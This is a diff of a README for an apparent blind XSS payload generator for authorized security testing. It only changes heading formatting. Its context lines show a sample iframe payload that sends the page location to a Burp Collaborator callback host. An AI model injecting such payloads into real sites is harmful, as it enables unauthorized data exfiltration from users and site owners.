@@ -41,7 +41,6 @@ Enter the output filename (e.g., blind_xss_payloads.txt): my_blind_xss_payloads.
 ```
 
 Payloads generated and saved to my_blind_xss_payloads.txt
-Sample Payloads
 
 Some examples of the generated payloads:
 
@@ -51,10 +50,11 @@ Some examples of the generated payloads:
 <iframe srcdoc='<script>window.location="https://example.burpcollaborator.net/iframe-srcdoc?"+btoa(parent.document.location)</script>'></iframe>
 ```
 
-Notes
+# Notes
 Testing in Legal Environments: This tool should only be used in environments where you have permission to perform security assessments. Unauthorized testing may violate laws and ethical guidelines.
 Customization: The payloads can be modified directly in the script or via del.txt and blind_xss_payloads.txt files for even more variations.
-License
+
+# License
 This project is licensed under the MIT License.
 
 
